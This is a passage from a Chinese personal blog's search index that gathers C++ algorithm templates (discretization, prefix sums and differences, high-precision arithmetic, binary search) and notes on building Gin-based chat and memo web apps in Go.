","permalink":"https://kevinerr.github.io/posts/algorithm/%E5%8C%BA%E9%97%B4%E5%90%88%E5%B9%B6/","summary":"https://www.acwing.com/problem/search/1/?csrfmiddlewaretoken=A6hJmK9QIKhI2BjKpv9ngRnfmmlSDTEY6DjbNvDxBtLwn1nSLHtW0NrLCd6KKoSn\u0026amp;search_content=%E5%8C%BA%E9%97%B4%E5%90%88%E5%B9%B6 思想 一、简述 区间合并 就是将坐标轴中两个存在交集 的区间合并 成一个 区间 。 二、 思想 1.将所有 区间 按左端点从小到大排序 2.从左到右遍历每个 区间 ，把","title":"区间合并"},{"content":"离散化思想(好像都可以用map来解决捏) 数据离散化是一个非常重要的思想。\n为什么要离散化?当以权值为下标的时候，有时候值太大，存不下。 所以把要离散化的每一个数组里面的数映射到另一个值小一点的数组里面去。\n打个比方，某个题目告诉你有1e4个数，每个数大小不超过1e10，要你对这些数进行操作，那么肯定不能直接开1e10大小的数组，但是1e4的范围就完全没问题。\n我们来看一下定义：离散化，把无限空间中有限的个体映射到有限的空间中去，以此提高算法的时空效率。（by百度百科）\n通俗的说，离散化是在不改变数据相对大小的条件下，对数据进行相应的缩小。例如：\n原数据：1,999,100000,15；处理后：1,3,4,2；\n原数据：{100,200}，{20,50000}，{1,400}；\n处理后：{3,4}，{2,6}，{1,5}；\n但是离散化仅适用于只关注元素之间的大小关系而不关注元素本身的值!\n假如你想写的更加专业就要采用以下步骤：\n1、排序\n2、去重\n3、索引\n首先我们要对所要进行离散化的数据进行排序：一般使用sort对数组或结构体排序。\n然后是去重操作，为了写出高效的代码，我们需要复习两个STL函数：unique（）和lower_bound（），他们同时隶属于#include。\nunique的作用是“去掉”容器中相邻元素的重复元素（不一定要求数组有序），它会把重复的元素添加到容器末尾（所以数组大小并没有改变），而返回值是去重之后的尾地址；\n函数lower_bound()在first和last中的前闭后开区间进行二分查找，返回大于或等于val的第一个元素位置。如果所有元素都小于val，则返回last的位置。【ps.upper_bound是返回第一个大于b[x]的指针，upper_bound（）=lower_bound（）+1】\n模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  vector\u0026lt;int\u0026gt; alls; // 存储所有待离散化的值 sort(alls.begin(), alls.end()); // 将所有值排序 alls.erase(unique(alls.begin(), alls.end()), alls.end()); // 去掉重复元素  // 二分求出x对应的离散化的值 int find(int x) // 找到第一个大于等于x的位置 {  int l = 0, r = alls.size() - 1;  while (l \u0026lt; r)  {  int mid = l + r \u0026gt;\u0026gt; 1;  if (alls[mid] \u0026gt;= x) r = mid;  else l = mid + 1;  }  return r + 1; // 映射到1, 2, ...n }   区间和 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; typedef pair\u0026lt;int,int\u0026gt; PII;  vector\u0026lt;PII\u0026gt; add , query; vector\u0026lt;int\u0026gt; alls; // 储存大区间内所有出现过的数 int a[300010] , s[300010];  int find(int x){ \tint pos; \tpos = lower_bound(alls.begin(),alls.end(),x) - alls.begin() ; //查询集中起来后的数的下标 \treturn pos+1; //下标从 1 开始; }  int main() { \tint n,m,x,c; \tcin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m; \twhile(n--){ \tcin\u0026gt;\u0026gt;x\u0026gt;\u0026gt;c; \tadd.push_back({x,c}); \talls.push_back(x); \t} \twhile(m--){ \tcin\u0026gt;\u0026gt;x\u0026gt;\u0026gt;c; \tquery.push_back({x,c}); \talls.push_back(x); \talls.push_back(c); \t} \tsort(alls.begin(),alls.end()); //由于是坐标，即可以排序去重 \talls.erase(unique(alls.begin(), alls.end()) , alls.end()); //在大区间内出现过的数集中排序去重 \t// unique()把不重复的元素排序放在最前边, 返回这些有序序列最后一个元素的后一个迭代器; \t\tfor(auto item : add){ \tint pos = find(item.first); //查询下标 ,然后累加; \ta[pos] += item.second; \t} \t\tfor(int i=1;i\u0026lt;=alls.size();i++) s[i] = s[i-1] + a[i] ; //前缀和; \t\tfor(auto item : query){ \tint l = find(item.first); \tint r = find(item.second); \tcout\u0026lt;\u0026lt;s[r]-s[l-1]\u0026lt;\u0026lt;endl; \t} \treturn 0; }   电影 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; unordered_map\u0026lt;int,int\u0026gt; st; const int N = 3*200005; int a[N],b[N],c[N],ans[N]; vector\u0026lt;int\u0026gt; alls; int n,m; int find(int x){  return lower_bound(alls.begin(),alls.end(),x)-alls.begin(); } int main() {  cin\u0026gt;\u0026gt;n;  for (int i = 1; i \u0026lt;=n; i ++ ){  cin\u0026gt;\u0026gt;a[i];  alls.push_back(a[i]);  }  cin\u0026gt;\u0026gt;m;  for (int i = 1; i \u0026lt;=m; i ++ ){  cin\u0026gt;\u0026gt;b[i];  alls.push_back(b[i]);  }  for (int i = 1; i \u0026lt;=m; i ++ ){  cin\u0026gt;\u0026gt;c[i];  alls.push_back(c[i]);  }  sort(alls.begin(),alls.end());  alls.erase(unique(alls.begin(),alls.end()),alls.end());  for(int i=1;i\u0026lt;=n;i++) ans[find(a[i])]++;  //遍历所有电影，按要求找到最多科学家会的电影  int ans0,ans1,ans2;  //ans0保存最终结果，ans1和ans2为中间结果  ans0=ans1=ans2=0;  for(int i=1;i\u0026lt;=m;i++){  //算出第i个电影音频语言的科学家数，和第i个字幕语言的科学家数  int anx=ans[find(b[i])],any=ans[find(c[i])];  //如果ans大于ans1或者前者相等且any大于ans2时，更新  if(anx\u0026gt;ans1 || (anx==ans1 \u0026amp;\u0026amp; any\u0026gt;ans2)){  ans0=i,ans1=anx,ans2=any;  }  }  if(ans0==0){  printf(\u0026#34;%d\\n\u0026#34;,1);  }else{  printf(\u0026#34;%d\\n\u0026#34;,ans0);  }   return 0; }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  //2个map也可以 #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; unordered_map\u0026lt;int,int\u0026gt; st; const int N = 200005; typedef pair\u0026lt;int, int\u0026gt; PII; unordered_map\u0026lt;int,PII\u0026gt; dd; PII r[N]; int n,m; int main() {  cin\u0026gt;\u0026gt;n;  for (int i = 0; i \u0026lt; n; i ++ ){  int x;  cin\u0026gt;\u0026gt;x;  st[x]++;  }  cin\u0026gt;\u0026gt;m;  for (int i = 0; i \u0026lt; m; i ++ ){  int a;  cin\u0026gt;\u0026gt;a;  r[i].first=st[a];  dd[i].first=st[a];  }  for (int i = 0; i \u0026lt; m; i ++ ){  int a;  cin\u0026gt;\u0026gt;a;  r[i].second=st[a];  dd[i].second=st[a];  }  sort(r,r+m);  for (auto d:dd){  if(d.second==r[m-1]){  cout\u0026lt;\u0026lt;d.first+1\u0026lt;\u0026lt;endl;  break;  }  }  return 0; }   金发姑娘和 N 头牛 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; const int N = 2*20005; int n,x,y,z; vector\u0026lt;int\u0026gt; alls; typedef pair\u0026lt;int, int\u0026gt; PII; PII a[N]; int s[N]; int find(int x){  return lower_bound(alls.begin(),alls.end(),x)-alls.begin()+1; } int main() {  cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;x\u0026gt;\u0026gt;y\u0026gt;\u0026gt;z;  for(int i =1;i\u0026lt;=n;i++){  cin\u0026gt;\u0026gt;a[i].first\u0026gt;\u0026gt;a[i].second;  alls.push_back(a[i].first);  alls.push_back(a[i].second);  }  sort(alls.begin(),alls.end());  alls.erase(unique(alls.begin(),alls.end()),alls.end());  for(int i =1;i\u0026lt;=n;i++){  int p = find(a[i].first),q=find(a[i].second);  s[0]+=x;  s[p]+=y-x,s[q+1]+=z-y;  }  int cur = 0,res= 0;;  for(int i =1;i\u0026lt;alls.size();i++){  cur+= s[i-1];  if(cur\u0026gt;res){  res=cur;  }  }  cout\u0026lt;\u0026lt;res\u0026lt;\u0026lt;endl;  return 0; }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; map\u0026lt;int,int\u0026gt; mp; int main(){  int n,x,y,z;  scanf(\u0026#34;%d%d%d%d\u0026#34;,\u0026amp;n,\u0026amp;x,\u0026amp;y,\u0026amp;z);  int l,r;  for(int i=0;i\u0026lt;n;i++){  scanf(\u0026#34;%d%d\u0026#34;,\u0026amp;l,\u0026amp;r);  mp[0]+=x;  mp[l]=mp[l]-x+y;  mp[r+1]=mp[r+1]-y+z;  }  int mx=0,cur=0;  for(auto iter:mp){  cur+=iter.second;  if(cur\u0026gt;mx){  mx=cur;  }  }  printf(\u0026#34;%d\\n\u0026#34;,mx);  return 0; }   粉刷栅栏 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; int n; const int N = 1e9+5; map\u0026lt;int, int\u0026gt; mp; int main(){  cin\u0026gt;\u0026gt;n;  int a = 0,b;  while(n--){  char c;  cin\u0026gt;\u0026gt;b\u0026gt;\u0026gt;c;  if(c==\u0026#39;R\u0026#39;){  mp[a]++;mp[a+b]--;a=a+b;  }else{  mp[a-b]++;mp[a]--;a=a-b;  }  }  int sum = 0, ans = 0, L;  //前缀和是差分的逆操作，用sum记录当前值，扫描一遍  for(auto [k, v] : mp){  cout\u0026lt;\u0026lt;k\u0026lt;\u0026lt;\u0026#34; \u0026#34;\u0026lt;\u0026lt;v\u0026lt;\u0026lt;endl;  // debug3(k, v, sum);  if(sum \u0026lt;= 1 \u0026amp;\u0026amp; sum + v \u0026gt; 1) L = k; //如果sum 从比2小变到比2大，那么k值就是区间左端点  else if(sum \u0026gt; 1 \u0026amp;\u0026amp; sum + v \u0026lt;= 1) ans += k - L; //反之就是区间右端点  sum += v;//更新sum 的值  }   cout \u0026lt;\u0026lt; ans;  return 0; }   https://www.acwing.com/problem/search/1/?csrfmiddlewaretoken=ZbNNyBOznDdROxrPJ79ujrDB4Y3Ir2uLvIPfZmiggmHF9XvX5jt33nH7kPOAyxIa\u0026amp;search_content=%E7%A6%BB%E6%95%A3%E5%8C%96\n","permalink":"https://kevinerr.github.io/posts/algorithm/%E7%A6%BB%E6%95%A3%E5%8C%96/","summary":"离散化思想(好像都可以用map来解决捏) 数据离散化是一个非常重要的思想。 为什么要离散化?当以权值为下标的时候，有时候值太大，存不下。 所以把要","title":"离散化"},{"content":"这个项目是基于WebSocket + MongoDB + MySQL + Redis。业务逻辑很简单，只是两人的聊天。\nWebSocket WebSocket是应用层第七层上的一个应用层协议，它必须依赖 HTTP 协议进行一次握手。 握手成功后，数据就直接从TCP通道传输，与HTTP无关了。即：WebSocket分为握手和数据传输阶段。 即进行了HTTP握手 + 双工的TCP连接。\nWebSocket 是一种在单个TCP连接上进行全双工通信的协议。\nWebSocket 使得客户端和服务器之间的数据交换变得更加简单，允许服务端主动向客户端推送数据。\n如果只是想左图这样的不断发送http请求，轮询的效率是非常低，非常浪费资源，所以就有了websocket协议了，建立在 TCP 协议之上，服务器端的实现比较容易。\nWebSocket协议一旦建立之后，互相沟通所消耗的请求头是很小的，服务器向客户端推送消息的功耗就小了。\ngorilla/websocket使用 1 2  首先向客户端发送消息使用WriteMessage(messageType int, data []byte),参数1为消息类型，参数2消息内容 _ = conn.Socket.WriteMessage(websocket.TextMessage, msg)   json与结构体的相互转化 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  // 回复的消息 type ReplyMsg struct { \tFrom string `json:\u0026#34;from\u0026#34;` \tCode int `json:\u0026#34;code\u0026#34;` \tContent string `json:\u0026#34;content\u0026#34;` }  replyMsg := \u0026amp;ReplyMsg{  Code: e.WebsocketEnd,  Content: \u0026#34;连接已断开\u0026#34;, }  msg, _ := json.Marshal(replyMsg)//将结构体转换成json字符串  //1.Unmarshal的第一个参数是json字符串，第二个参数是接受json解析的数据结构。 //第二个参数必须是指针，否则无法接收解析的数据，如replyMsg2仍为空对象ReplyMsg{} //2.可以直接stu:=new(StuRead),此时的stu自身就是指针 replyMsg2:= ReplyMsg{} err:=json.Unmarshal(msg,\u0026amp;replyMsg2)   main.go启动一个线程来监听ws的连接\nws://localhost:3000/ws?uid=1\u0026amp;toUid=2\n会创建一个用户实例并将用户注册到用户管理上，并启动2个go线程来实现这个用户的读写线程\nStart()监听到了Manager.Register:创建一个replyMsg并转化为json格式传入Socket中\nws://localhost:3000/ws?uid=1\u0026amp;toUid=2\n{ \u0026ldquo;type\u0026rdquo;:1, \u0026ldquo;content\u0026rdquo;:\u0026ldquo;111\u0026rdquo; }\nreids才会存储Client.Id并设置过期时间\n并且会传一个Manager.Broadcast返回给该用户其对方的状态，并将content存入mangodb中\n如果对方在线就会往往对方的Client.Send中传入content\n一旦某个用户的send中有消息，\n","permalink":"https://kevinerr.github.io/posts/tech/%E5%9F%BA%E4%BA%8Egin%E7%9A%84%E8%81%8A%E5%A4%A9%E7%B3%BB%E7%BB%9F/","summary":"这个项目是基于WebSocket + MongoDB + MySQL + Redis。业务逻辑很简单，只是两人的聊天。 WebSocket WebSocket是应用层第七层上的一个应用层协议，","title":"基于gin的聊天系统"},{"content":"此项目使用Gin+Gorm ，基于RESTful API实现的一个备忘录\nhttps://blog.csdn.net/weixin_45304503/article/details/120680957\n项目主要功能介绍  用户注册登录 ( jwt-go鉴权 ) 新增 / 删除 / 修改 / 查询 备忘录 存储每条备忘录的浏览次数view 分页功能  项目主要依赖： Golang V1.15\n Gin Gorm mysql redis ini jwt-go  项目结构 1 2 3 4 5 6 7 8 9 10 11 12 13  TodoList/ ├── api ├── cache ├── conf ├── middleware ├── model ├── pkg │ ├── e │ ├── logging │ ├── util ├── routes ├── serializer └── service   api : 用于定义接口函数 cache : 放置redis缓存 conf : 用于存储配置文件 middleware : 应用中间件 model : 应用数据库模型 pkg / e : 封装错误码 pkg / logging : 日志打印 pkg / util : 工具函数 routes : 路由逻辑处理 serializer : 将数据序列化为 json 的函数 service : 接口函数的实现\n项目结构 1 2 3 4 5 6 7 8 9 10 11  douyin_demo/ ├── controller ├── logs ├── conf ├── middleware ├── repository ├── pkg │ ├── e │ ├── util ├── serializer └── service   controller: 用于定义接口函数 logs: 日志 conf : 用于存储配置文件 middleware : 应用中间件 repository: 应用数据库模型 pkg / e : 封装错误码 pkg / util : 工具函数 serializer : 将数据序列化为 json 的函数 service : 接口函数的实现\n1 2  go mod init to-do-list go mod tidy   开发过程 1、使用ini管理mysql和redis等配置 2、在model文件夹使用gorm来管理数据库 在实际项目中定义数据库模型注意以下几点：\n1、结构体的名称必须首字母大写 ，并和数据库表名称对应。例如：表名称为 user 结构体 名称定义成 User，表名称为 article_cate 结构体名称定义成 ArticleCate\n2、结构体中的字段名称首字母必须大写，并和数据库表中的字段一一对应。例如：下面结 构体中的 Id 和数据库中的 id 对应,Username 和数据库中的 username 对应，Age 和数据库中 的 age 对应，Email 和数据库中的 email 对应，AddTime 和数据库中的 add_time 字段对应\n3、默认情况表名是结构体名称的复数形式。如果我们的结构体名称定义成 User，表示这个 模型默认操作的是 users 表\n4、gorm.Model 是一个包含了 ID, CreatedAt, UpdatedAt, DeletedAt 四个字段的Golang结构体\n5、数据库中存储密码要加密，使用bcrypt\n6、AutoMigrate自动迁移（牛\n3、路由中使用swagger 1 2 3 4 5 6 7 8 9 10  //swag go get github.com/swaggo/swag/cmd/swag //$ GOPATH / bin /下会看到多了一个swag。把$ GOPATH / bin /加到PATH后，就可以直接用swag命令行了 //在包含main.go的Go工程的根目录下执行swag init，swag会检索当前工程里的swag注解（类似上述Java中的注解），生成docs.go以及swagger.json/yaml  swaggerFiles \u0026#34;github.com/swaggo/files\u0026#34; ginSwagger \u0026#34;github.com/swaggo/gin-swagger\u0026#34; _ \u0026#34;to-do-list/docs\u0026#34; // 这里需要引入本地已生成文档  r.GET(\u0026#34;/swagger/*any\u0026#34;, ginSwagger.WrapHandler(swaggerFiles.Handler))   4、路由中使用中间件 所有路由都需要通过logging和cors中间件\n1  r.Use(middleware.NewLogger(),middleware.Cors())   将所有日志输出到logs文件夹下，并以日期为文件夹名\n1 2 3  time=\u0026#34;2022-03-26 20:50:37\u0026#34; level=info msg=\u0026#34;| 200 | 466.1842ms | ::1 | POST | /api/v1/user/register |\u0026#34; time=\u0026#34;2022-03-26 20:50:43\u0026#34; level=info msg=\u0026#34;| 200 | 15.2263ms | ::1 | POST | /api/v1/user/register |\u0026#34; time=\u0026#34;2022-03-26 21:15:47\u0026#34; level=info msg=\u0026#34;| 200 | 376.1199ms | ::1 | POST | /api/v1/user/login |\u0026#34;   5、登录保护 注册用户\napi中\nShouldBind能够基于请求的不同，自动提取JSON、form表单和QueryString类型的数据，并把值绑定到指定的结构体对象。\n1 2 3 4 5 6 7 8 9 10  func UserRegister(c *gin.Context) { \tvar userRegisterService service.UserService //相当于创建了一个UserRegisterService对象，调用这个对象中的Register方法。 \tif err := c.ShouldBind(\u0026amp;userRegisterService); err == nil { \tres := userRegisterService.Register() \tc.JSON(200, res) \t} else { \tc.JSON(400, ErrorResponse(err)) \tutil.Logger().Info(err) \t} }   在service的逻辑为：\n1、查询数据库中是否由此用户名\n2、var user model.User\n3、将前端传来的用户名存入user\n3、将前端传来的密码加密后存入user\n4、在数据库中保存user并返回\n登录用户\n逻辑很简单，这里会返回一个token，后续进行备忘录的操作都需要这个token\n1 2  authed := v1.Group(\u0026#34;/\u0026#34;) //需要登陆保护 authed.Use(middleware.JWT())   6、操作备忘录 操作备忘录时传入的uid、tid都是从token中解析的claims中获得，确保用户已登录\n7、前后端分离 使用PostForm获取不到vue传来的数据，因为vue把数据封装成了json，可以使用map，json解析或gin自带的Bind\naxios实例创建成功之后，不会因为我们的storage储存的token变化而变化\n为了让每次请求都能动态的变化head里的token，需要配置一个interceptor\n1 2 3 4 5 6 7 8 9  // Add a request interceptor service.interceptors.request.use((config) =\u0026gt; {  // Do something before request is sent  Object.assign(config.headers, { Authorization: `Bearer ${storageService.get(storageService.USER_TOKEN)}` });  return config; }, (error) =\u0026gt; {  // Do something with request error  return Promise.reject(error); });   本地缓存不是响应式的\n","permalink":"https://kevinerr.github.io/posts/tech/%E5%9F%BA%E4%BA%8Egin%E7%9A%84%E5%A4%87%E5%BF%98%E5%BD%95%E5%BC%80%E5%8F%91/","summary":"此项目使用Gin+Gorm ，基于RESTful API实现的一个备忘录 https://blog.csdn.net/weixin_45304503/article/details/120680957 项目主要功能介绍 用户注册登录 ( jwt-go鉴权 ) 新增 / 删除 / 修改 / 查询","title":"基于gin的备忘录开发"},{"content":"前缀和是一种极其优秀的线性结构，也是一种重要的思想，能极大地降低区间查询的时间复杂度。\n一维前缀和 1 2  S[i] = a[1] + a[2] + ... a[i] a[l] + ... + a[r] = S[r] - S[l - 1]   最佳牛围栏 二维前缀和 1 2 3  S[i, j] = 第i行j列格子左上部分所有元素的和 以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵的和为： S[x2, y2] - S[x1 - 1, y2] - S[x2, y1 - 1] + S[x1 - 1, y1 - 1]   1  s[i][j] = s[i - 1][j] + s[i][j - 1] - s[i - 1][j - 1] + arr[i][j]   1  s[x2][y2] - s[x1 - 1][y2] - s[x2][y1 - 1] + s[x1 - 1][y1 - 1]   激光炸弹 一维差分 1  给区间[l, r]中的每个数加上c：B[l] += c, B[r + 1] -= c   增减序列 最高的牛 二维差分 1 2  给以(x1, y1)为左上角，(x2, y2)为右下角的子矩阵中的所有元素加上c： S[x1, y1] += c, S[x2 + 1, y1] -= c, S[x1, y2 + 1] -= c, S[x2 + 1, y2 + 1] += c   https://zhuanlan.zhihu.com/p/268883850\n","permalink":"https://kevinerr.github.io/posts/algorithm/%E5%89%8D%E7%BC%80%E5%92%8C%E4%B8%8E%E5%B7%AE%E5%88%86/","summary":"前缀和是一种极其优秀的线性结构，也是一种重要的思想，能极大地降低区间查询的时间复杂度。 一维前缀和 1 2 S[i] = a[1] + a[2] + ... a[i] a[l] + ... + a[r] = S[r] - S[l - 1] 最","title":"前缀和与差分"},{"content":"高精度加法 模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // C = A + B, A \u0026gt;= 0, B \u0026gt;= 0 vector\u0026lt;int\u0026gt; add(vector\u0026lt;int\u0026gt; \u0026amp;A, vector\u0026lt;int\u0026gt; \u0026amp;B) {  if (A.size() \u0026lt; B.size()) return add(B, A);   vector\u0026lt;int\u0026gt; C;  int t = 0;  for (int i = 0; i \u0026lt; A.size(); i ++ )  {  t += A[i];  if (i \u0026lt; B.size()) t += B[i];  C.push_back(t % 10);  t /= 10;  }   if (t) C.push_back(t);  return C; }   67. 二进制求和 2. 两数相加 66. 加一 高精度减法 模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  // C = A - B, 满足A \u0026gt;= B, A \u0026gt;= 0, B \u0026gt;= 0 vector\u0026lt;int\u0026gt; sub(vector\u0026lt;int\u0026gt; \u0026amp;A, vector\u0026lt;int\u0026gt; \u0026amp;B) {  vector\u0026lt;int\u0026gt; C;  for (int i = 0, t = 0; i \u0026lt; A.size(); i ++ )  {  t = A[i] - t;  if (i \u0026lt; B.size()) t -= B[i];  C.push_back((t + 10) % 10);  if (t \u0026lt; 0) t = 1;  else t = 0;  }   while (C.size() \u0026gt; 1 \u0026amp;\u0026amp; C.back() == 0) C.pop_back();  return C; }   高精度乘低精度 模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  // C = A * b, A \u0026gt;= 0, b \u0026gt;= 0 vector\u0026lt;int\u0026gt; mul(vector\u0026lt;int\u0026gt; \u0026amp;A, int b) {  vector\u0026lt;int\u0026gt; C;   int t = 0;  for (int i = 0; i \u0026lt; A.size() || t; i ++ )  {  if (i \u0026lt; A.size()) t += A[i] * b;  C.push_back(t % 10);  t /= 10;  }   while (C.size() \u0026gt; 1 \u0026amp;\u0026amp; C.back() == 0) C.pop_back();   return C; }   43. 字符串相乘 高精度除以低精度 模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  // A / b = C ... r, A \u0026gt;= 0, b \u0026gt; 0 vector\u0026lt;int\u0026gt; div(vector\u0026lt;int\u0026gt; \u0026amp;A, int b, int \u0026amp;r) {  vector\u0026lt;int\u0026gt; C;  r = 0;  for (int i = A.size() - 1; i \u0026gt;= 0; i -- )  {  r = r * 10 + A[i];  C.push_back(r / b);  r %= b;  }  reverse(C.begin(), C.end());  while (C.size() \u0026gt; 1 \u0026amp;\u0026amp; C.back() == 0) C.pop_back();  return C; }   首先是考察一下coding能力，一般来说都是这样的加减乘除的运算，接下来一定会是关于数据结构（或者说面向对象）的设计。这些题目的本身都是为高精度BigInteger服务的，面试官会问一些关于这个数据结构设计的问题，比方说假设让你来设计这个类，用什么数据结构来存（比方数组还是链表，各有什么利弊），须要哪些接口（构造函数，加减乘除运算等等），还有比方要设计构造函数，须要什么接口的构造函数（这里赋值构造函数，赋值运算符这些肯定是须要的，可是要注意必须提供对于常规类型比方int，long这些的接口，一个好的高精度类肯定是要对照它更弱的数据结构进行兼容的）。\n","permalink":"https://kevinerr.github.io/posts/algorithm/%E9%AB%98%E7%B2%BE%E5%BA%A6/","summary":"高精度加法 模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // C = A + B, A \u0026gt;= 0, B \u0026gt;= 0 vector\u0026lt;int\u0026gt; add(vector\u0026lt;int\u0026gt; \u0026amp;A, vector\u0026lt;int\u0026gt; \u0026amp;B) { if (A.size() \u0026lt; B.size()) return add(B, A); vector\u0026lt;int\u0026gt; C; int t = 0; for (int i = 0; i \u0026lt; A.size(); i ++ ) { t +=","title":"高精度"},{"content":"整数二分 思想\n模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  bool check(int x) {/* ... */} // 检查x是否满足某种性质  // 区间[l, r]被划分成[l, mid]和[mid + 1, r]时使用： int bsearch_1(int l, int r) {  while (l \u0026lt; r)  {  int mid = l + r \u0026gt;\u0026gt; 1;  if (check(mid)) r = mid; // check()判断mid是否满足性质  else l = mid + 1;  }  return l; } // 区间[l, r]被划分成[l, mid - 1]和[mid, r]时使用： int bsearch_2(int l, int r) {  while (l \u0026lt; r)  {  int mid = l + r + 1 \u0026gt;\u0026gt; 1;  if (check(mid)) l = mid;  else r = mid - 1;  }  return l; }   数组中数值和下标相等的元素 1 2 3 4 5 6 7 8 9 10 11 12 13 14  class Solution { public:  int getNumberSameAsIndex(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  int n = nums.size();  int l =0,r=n-1;  while(l\u0026lt;=r){  int mid = (l+r)\u0026gt;\u0026gt;1;  if(mid==nums[mid]) return mid;  else if(mid\u0026gt;nums[mid]) l=mid+1;  else r=mid-1;  }  return -1;  } };   数字在排序数组中出现的次数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  class Solution { public:  int getNumberOfK(vector\u0026lt;int\u0026gt;\u0026amp; nums , int k) {  int res = 0;  if(nums.size()==0) return 0;  int l=0,r=nums.size()-1;  while(l\u0026lt;r){  int mid = (l+r)\u0026gt;\u0026gt;1;  if(nums[mid]\u0026lt;k) l=mid+1;  else r=mid;  }  int a = l;  if(nums[a]!=k) return 0;  l=0,r=nums.size()-1;  while(l\u0026lt;r){  int mid = (l+r+1)\u0026gt;\u0026gt;1;  if(nums[mid]\u0026lt;=k) l=mid;  else r=mid-1;  }  return r-a+1;  } };   0到n-1中缺失的数字 1 2 3 4 5 6 7 8 9 10 11 12 13 14  class Solution { public:  int getMissingNumber(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  if (nums.empty()) return 0;  int l =0,r=nums.size()-1;  while(l\u0026lt;r){  int mid = l+r\u0026gt;\u0026gt;1;  if(mid\u0026lt;nums[mid]) r = mid;  else l=mid+1;  }  if(nums[r]==r) r++;  return r;  } };   旋转数组的最小数字 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Solution { public:  int findMin(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  int n = nums.size() - 1;  if (n \u0026lt; 0) return -1;  while (n \u0026gt; 0 \u0026amp;\u0026amp; nums[n] == nums[0]) n -- ;  if (nums[n] \u0026gt;= nums[0]) return nums[0];  int l = 0, r = n;  while (l \u0026lt; r) {  int mid = l + r \u0026gt;\u0026gt; 1; // [l, mid], [mid + 1, r]  if (nums[mid] \u0026lt; nums[0]) r = mid;  else l = mid + 1;  }  return nums[r];  } };   不修改数组找出重复的数字 1 2 3 4 5 6 7 8 9 10 11 12 13 14  class Solution { public:  int duplicateInArray(vector\u0026lt;int\u0026gt;\u0026amp; nums) {  int l = 1, r = nums.size() - 1;  while (l \u0026lt; r) {  int mid = l + r \u0026gt;\u0026gt; 1; // 划分的区间：[l, mid], [mid + 1, r]  int s = 0;  for (auto x : nums) s += x \u0026gt;= l \u0026amp;\u0026amp; x \u0026lt;= mid;  if (s \u0026gt; mid - l + 1) r = mid;  else l = mid + 1;  }  return r;  } };   浮点数二分 模板 1 2 3 4 5 6 7 8 9 10 11 12 13  bool check(double x) {/* ... */} // 检查x是否满足某种性质  double bsearch_3(double l, double r) {  const double eps = 1e-6; // eps 表示精度，取决于题目对精度的要求  while (r - l \u0026gt; eps)  {  double mid = (l + r) / 2;  if (check(mid)) r = mid;  else l = mid;  }  return l; }   ","permalink":"https://kevinerr.github.io/posts/algorithm/%E4%BA%8C%E5%88%86/","summary":"整数二分 思想 模板 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 bool check(int x) {/* ... */} // 检查x是否满足某种性质 // 区间[l, r]被划分成[l, mid]和","title":"二分"},{"content":"[]: https://www.acwing.com/problem/content/description/3765/\n二进制矩阵 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55  #include \u0026lt;iostream\u0026gt;#include \u0026lt;cstring\u0026gt;#include \u0026lt;algorithm\u0026gt; using namespace std;  const int N = 110;  int n, m; char g[N][N];  void pL(int i, int j, int k) {  if (!k) printf(\u0026#34;%d %d %d %d %d %d\\n\u0026#34;, i, j, i + 1, j, i, j + 1);  //尖尖左上角  else if (k == 1) printf(\u0026#34;%d %d %d %d %d %d\\n\u0026#34;, i, j - 1, i, j, i + 1, j);  //尖尖右上角  else if (k == 2) printf(\u0026#34;%d %d %d %d %d %d\\n\u0026#34;, i - 1, j, i, j, i, j - 1);  //尖尖右下角  else printf(\u0026#34;%d %d %d %d %d %d\\n\u0026#34;, i - 1, j, i, j, i, j + 1);  //尖尖左下角 }  int main() {  int T;  cin \u0026gt;\u0026gt; T;  while (T -- )  {  cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m;  int res = 0;  for (int i = 1; i \u0026lt;= n; i ++ )  {  cin \u0026gt;\u0026gt; g[i] + 1;  for (int j = 1; j \u0026lt;= m; j ++ )  if (g[i][j] == \u0026#39;1\u0026#39;)  res += 3;  }  cout \u0026lt;\u0026lt; res \u0026lt;\u0026lt; endl;  for (int i = 1; i \u0026lt;= n; i ++ )  for (int j = 1; j \u0026lt;= m; j ++ )  if (g[i][j] == 